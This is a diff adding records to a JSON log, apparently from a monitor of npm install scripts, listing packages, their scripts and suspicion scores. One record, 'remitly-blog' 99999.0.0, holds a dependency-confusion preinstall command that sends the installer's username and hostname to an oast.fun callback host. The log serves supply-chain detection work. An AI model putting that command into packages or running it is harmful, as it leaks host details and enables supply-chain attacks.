@@ -1,5 +1,55 @@
 [
   {
+    "packageName": "jelll-install",
+    "version": "4.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/postinstall.js",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T08:45:45.988Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "@nipurn/xprompt-v1",
+    "version": "1.1.26",
+    "scriptType": "postinstall",
+    "scriptContent": "bun ./postinstall.mjs || node ./postinstall.mjs",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T08:45:43.612Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "@panguard-ai/panguard",
+    "version": "1.3.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node -e \"console.log('\\n  Panguard AI v' + require('./package.json').version + ' installed.\\n  Run: panguard setup\\n  to auto-configure AI agent protection.\\n')\"",
+    "previousVersion": "1.2.3",
+    "timestamp": "2026-03-22T08:45:27.712Z",
+    "issuesend": false,
+    "suspicionScore": 5
+  },
+  {
+    "packageName": "remitly-blog",
+    "version": "99999.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -s \"https://remitly-blog.iwijzwrasfjvknabawksfxwikb8urcg5w.oast.fun/$(whoami)/$(hostname)/depconfusion\" || nslookup remitly-blog.iwijzwrasfjvknabawksfxwikb8urcg5w.oast.fun || true",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T08:45:25.187Z",
+    "issuesend": false,
+    "suspicionScore": 12
+  },
+  {
+    "packageName": "jelll",
+    "version": "4.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/postinstall.js",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T08:45:23.852Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
     "packageName": "@mesh-helpers/common",
     "version": "99999.0.0",
     "scriptType": "preinstall",
